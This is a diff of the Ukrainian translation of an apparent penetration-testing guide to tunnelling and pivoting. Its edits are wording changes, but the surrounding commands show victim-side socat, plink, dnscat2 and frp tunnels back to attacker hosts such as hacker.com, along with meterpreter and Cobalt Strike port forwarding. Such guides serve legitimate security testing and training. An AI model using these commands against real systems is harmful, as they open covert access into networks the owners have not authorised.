@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** та **SYN** сканування не можуть бути тунельовані через socks проксі, тому ми повинні **вимкнути виявлення ping** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
+> **ICMP** та **SYN** сканування не можуть бути тунельовані через socks проксі, тому ми повинні **вимкнути пінг виявлення** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
 
 ## **Bash**
 
@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Відкрийте новий порт на SSH сервері --> Інший порт
+Відкрийте новий порт на SSH-сервері --> Інший порт
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -108,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (активна сесія) --> Третій_комп'ютер:Порт
+Локальний порт --> Скомпрометований хост (активна сесія) --> Третій_бокс:Порт
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -160,10 +160,10 @@ rportfwd stop [bind port]
 - Трафік **тунелюється в межах C2 трафіку Beacon**, включаючи P2P посилання.
 - **Привілеї адміністратора не потрібні** для створення зворотних портових переказів на високих портах.
 
-### rPort2Port локально
+### rPort2Port local
 
 > [!WARNING]
-> У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server) і звідти до вказаного хоста:порту.
+> У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server), а звідти до вказаного хоста:порту.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Ви можете обійти **неавторизований проксі**, виконавши цей рядок замість останнього в консолі жертви:
+Ви можете обійти **неавторизований проксі**, виконавши цю команду замість останньої в консолі жертви:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Це як консольна версія PuTTY (опції дуже схожі на клієнт ssh).
 
-Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш ssh сервіс і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
+Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш сервіс ssh і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -350,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Вам потрібно мати **доступ до RDP через систему**.\
 Завантажте:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP-з'єднання**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** ось так:
@@ -364,7 +364,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Тепер підтвердіть на вашій машині (атакуючого), що порт 1080 слухає:
+Тепер підтвердіть на вашій машині (атакуючий), що порт 1080 слухає:
 ```
 netstat -antb | findstr 1080
 ```
@@ -373,10 +373,10 @@ netstat -antb | findstr 1080
 ## Проксування Windows GUI додатків
 
 Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
-У **Profile -> Proxy Servers** додайте IP-адресу та порт SOCKS сервера.\
-У **Profile -> Proxification Rules** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.
+У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS-сервера.\
+У **Профіль -> Правила проксування** додайте назву програми, яку потрібно проксувати, та з'єднання з IP-адресами, які ви хочете проксувати.
 
-## Обхід NTLM проксі
+## Обхід проксі NTLM
 
 Раніше згадуваний інструмент: **Rpivot**\
 **OpenVPN** також може обійти це, встановивши ці параметри у файлі конфігурації:
@@ -434,7 +434,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **У PowerShell**
 
-Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у PowerShell:
+Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у powershell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -570,15 +570,15 @@ Tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-Запустіть з'єднувач:
+Розпочніть з'єднувач:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Оскільки весь трафік виходить з хоста **вихідний через 443**, тунелі Cloudflared є простим способом обійти вхідні ACL або межі NAT. Зверніть увагу, що бінарний файл зазвичай працює з підвищеними привілеями – використовуйте контейнери або прапорець `--user`, коли це можливо.
+Оскільки весь трафік виходить з хоста **вихідний через 443**, тунелі Cloudflared є простим способом обійти вхідні ACL або межі NAT. Зверніть увагу, що бінарний файл зазвичай працює з підвищеними привілеями – використовуйте контейнери або прапор `--user`, коли це можливо.
 
 ## FRP (Швидкий зворотний проксі)
 
-[`frp`](https://github.com/fatedier/frp) є активно підтримуваним зворотним проксі на Go, який підтримує **TCP, UDP, HTTP/S, SOCKS та P2P NAT-пробивання**. Починаючи з **v0.53.0 (травень 2024)**, він може діяти як **SSH Tunnel Gateway**, тому цільовий хост може створити зворотний тунель, використовуючи лише стандартний клієнт OpenSSH – додатковий бінарний файл не потрібен.
+[`frp`](https://github.com/fatedier/frp) є активно підтримуваним зворотним проксі на Go, який підтримує **TCP, UDP, HTTP/S, SOCKS та P2P NAT-hole-punching**. Починаючи з **v0.53.0 (травень 2024)**, він може діяти як **SSH Tunnel Gateway**, тому цільовий хост може створити зворотний тунель, використовуючи лише стандартний клієнт OpenSSH – додатковий бінарний файл не потрібен.
 
 ### Класичний зворотний TCP тунель
 ```bash
@@ -599,7 +599,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Використання нового SSH шлюзу (без frpc бінарного файлу)
+### Використання нового SSH шлюзу (без бінарного frpc)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -608,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Вищезазначена команда публікує порт жертви **8080** як **attacker_ip:9000** без розгортання будь-яких додаткових інструментів – ідеально для живого використання ресурсів.
+Вищезазначена команда публікує порт жертви **8080** як **attacker_ip:9000** без розгортання будь-яких додаткових інструментів – ідеально для використання ресурсів на місці.
 
 ## Інші інструменти для перевірки
 
